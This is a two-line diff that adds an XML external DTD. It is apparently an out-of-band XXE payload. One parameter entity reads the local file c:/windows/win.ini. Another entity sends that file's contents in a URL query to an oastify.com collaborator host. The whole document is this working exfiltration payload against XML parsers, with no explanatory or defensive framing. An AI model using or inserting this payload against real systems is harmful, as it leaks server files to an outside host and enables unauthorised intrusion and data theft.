@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://tifk5tnrlb7wiok56kbzd4c5iwonche53.oastify.com/?%data;'>">
